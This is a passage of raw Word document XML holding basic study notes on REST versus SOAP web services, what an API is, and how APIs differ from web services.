      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F6FFE1"/>
        </w:rPr>
        <w:t>RESTful</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F6FFE1"/>
        </w:rPr>
        <w:t xml:space="preserve"> web services</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F6FFE1"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F6FFE1"/>
        </w:rPr>
        <w:t>inherits</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F6FFE1"/>
        </w:rPr>
        <w:t xml:space="preserve"> security measures</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F6FFE1"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F6FFE1"/>
        </w:rPr>
        <w:t>from the underlying transport.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="293"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REST</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>permits different</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data format such as Plain text, HTML, XML, JSON etc.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="293" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F6FFE1"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F6FFE1"/>
        </w:rPr>
        <w:t>REST</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F6FFE1"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F6FFE1"/>
        </w:rPr>
        <w:t>more preferred</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F6FFE1"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F6FFE1"/>
        </w:rPr>
        <w:t>than SOAP.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00CF6781" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="360" w:beforeAutospacing="0" w:after="360" w:afterAutospacing="0" w:line="401" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="666666"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CF6781">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="666666"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>REST</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF6781">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="666666"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00CF6781">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="666666"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>describes a set of architectural principles by which data can be transmitted over a standardized interface (such as HTTP). REST does not contain an additional messaging layer and focuses on design rules for creating stateless services. A client can access the resource using the unique</w:t>
      </w:r>
      <w:r w:rsidRPr="00CF6781">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="666666"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:hyperlink r:id="rId202" w:history="1">
        <w:r w:rsidRPr="00CF6781">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
            <w:color w:val="00B3AC"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>URI</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00CF6781">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="666666"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00CF6781">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="666666"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">and a representation of the resource is returned. With each new resource representation, the client is said to transfer state. While accessing </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CF6781">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="666666"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>RESTful</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CF6781">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="666666"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> resources with HTTP protocol, the URL of the resource serves as the resource identifier and GET, PUT, DELETE, POST and HEAD are the standard HTTP operations to be performed on that resource.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="293" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rStyle w:val="transcript"/>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="777777"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00547F0F" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t xml:space="preserve">What is </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>API:</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00547F0F" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve">API stands for Application Programming Interface, i.e. </w:t>
      </w:r>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>API is the way for an application to interact with certain system/application/library/etc.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00547F0F" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">In layman's terms, I've always said an </w:t>
      </w:r>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>API is like a translator between two people who speak different languages. In software,</w:t>
      </w:r>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> data can be consumed or distributed using an API (or translator) so that two different kinds of software can communicate. Good software has a strong translator (API) that follows rules and protocols for security and data cleanliness.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00547F0F" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00547F0F" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="293" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="242729"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
          <w:color w:val="242729"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>Where it is used</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00547F0F" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0" w:line="293" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve">An example, </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>You</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve"> are buying an item in online through your credit card. You will provide credit card details and press continue button. It will tell you whether your information is correct or not. To provide these results, there </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>are lot</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve"> of things in the background.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00547F0F" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0" w:line="293" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>The application will send your credit card details to a remote application which will validate your information and send the result back your application. API is used in this scenario.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00547F0F" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00547F0F" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">API </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>Vs</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t xml:space="preserve"> Web Services:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00547F0F" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>Web services are a specific subset of APIs.</w:t>
      </w:r>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:br/>
        <w:t>APIs can have many forms, whether they communicate over the Web, over other Internet protocols, or even inter-process on the same machine, or inside the same machine and process.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00547F0F" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:spacing w:before="225" w:after="225" w:line="480" w:lineRule="atLeast"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>A Web service uses only three styles of use: SOAP, REST and XML-RPC for communication whereas API may use any style for communication.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00547F0F" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00267DFA" w:rsidRPr="00547F0F" w:rsidRDefault="00267DFA" w:rsidP="00267DFA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="333333"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>API</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="333333"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="333333"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>An application programming interface (API) is a set of routines, data structures, object classes and/or protocols provided by libraries and/or operating system services in order to support the building of applications.</w:t>
      </w:r>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="333333"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="333333"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>Webservice</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="333333"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:br/>
        <w:t>A Web Service is defined by the W3C as "a software system designed to support interoperable machine-to-machine interaction over a network"</w:t>
      </w:r>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">Clearly, both are means of communications. The </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>diference</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve"> is that Web Service almost always involves communication over network and HTTP is the most commonly used protocol. Web service also uses SOAP, REST, and XML-RPC as a means of communication. While an API can use any means of communication e.g. DLL files in C/C++, Jar files/ RMI in java, Interrupts in Linux kernel API etc.</w:t>
      </w:r>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00547F0F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:br/>
